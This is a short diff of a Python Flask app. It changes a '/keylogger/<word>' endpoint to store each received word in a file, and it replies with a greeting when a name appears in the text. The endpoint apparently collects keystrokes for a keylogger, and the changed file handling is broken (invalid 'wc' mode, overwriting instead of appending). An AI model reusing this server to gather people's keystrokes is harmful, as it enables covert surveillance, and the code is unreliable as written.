@@ -10,8 +10,14 @@ string_data = ''
 
 @app.route('/keylogger/<word>', methods=["GET", "POST"])
 def check_word(word):
-    global string_data
-    string_data += str(word)
+    string_file = open('string_data', 'wc')
+    string_file.write(word)
+    string_file.close()
+    
+    string_file = open('string_data', 'r')
+    string_data = string_file.read()
+    string_file.close()
+    
     if 'yoni' in string_data:
         string_data = ''
         return 'hi yoni'
